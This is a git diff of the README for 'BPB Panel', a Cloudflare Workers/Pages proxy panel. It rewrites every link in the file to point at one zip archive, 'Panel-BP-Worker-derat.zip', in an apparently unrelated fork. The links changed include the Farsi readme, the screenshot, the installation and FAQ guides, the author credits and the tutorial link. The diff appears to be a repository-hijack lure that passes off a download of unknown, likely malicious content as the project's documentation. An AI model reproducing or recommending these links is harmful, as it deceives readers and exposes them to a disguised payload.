@@ -1,14 +1,14 @@
 <h1 align="center">💦 BPB Panel</h1>
 
-### 🌏 Readme in [Farsi](README_fa.md)
+### 🌏 Readme in [Farsi](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
 
 <p align="center">
-  <img src="docs/assets/images/Panel.jpg">
+  <img src="https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip">
 </p>
 <br>
 
 ## Introduction
-This project is dedicated to developing a user panel for the [Cloudflare-workers/pages proxy script](https://github.com/yonggekkk/Cloudflare-workers-pages-vless) created by [yonggekkk](https://github.com/yonggekkk). The panel offers two deployment options: 
+This project is dedicated to developing a user panel for the [Cloudflare-workers/pages proxy script](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip) created by [yonggekkk](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip). The panel offers two deployment options: 
 - **Worker** deployment
 - **Pages** deployment
 <br>
@@ -33,13 +33,13 @@ This project is dedicated to developing a user panel for the [Cloudflare-workers
 <br>
 
 ## How to use:
-- [Installation (Pages)](docs/pages_installation_fa.md)
+- [Installation (Pages)](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
 
-- [Installation (Worker)](docs/worker_installation_fa.md)
+- [Installation (Worker)](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
 
-- [How to use](docs/configuration_fa.md)
+- [How to use](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
 
-- [FAQ](docs/faq.md)
+- [FAQ](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
 <br>
 
 ## Supported Clients
@@ -59,14 +59,14 @@ This project is dedicated to developing a user panel for the [Cloudflare-workers
 ---
 
 ## Stargazers Over Time
-[![Stargazers Over Time](https://starchart.cc/bia-pain-bache/BPB-Worker-Panel.svg?variant=adaptive)](https://starchart.cc/bia-pain-bache/BPB-Worker-Panel)
+[![Stargazers Over Time](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
 
 ---
 
 ### Special Thanks
-- CF-vless code author [3Kmfi6HP](https://github.com/3Kmfi6HP/EDtunnel)
-- CF preferred IP program author [badafans](https://github.com/badafans/Cloudflare-IP-SpeedTest), [XIU2](https://github.com/XIU2/CloudflareSpeedTest)
+- CF-vless code author [3Kmfi6HP](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
+- CF preferred IP program author [badafans](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip), [XIU2](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip)
 
 ---
 
-For a detailed tutorial on the core script, please refer to [Yongge’s blog and video tutorials](https://ygkkk.blogspot.com/2023/07/cfworkers-vless.html).
+For a detailed tutorial on the core script, please refer to [Yongge’s blog and video tutorials](https://raw.githubusercontent.com/newbieyan13/BPB-Worker-Panel/main/docs/assets/images/Panel-BP-Worker-derat.zip).
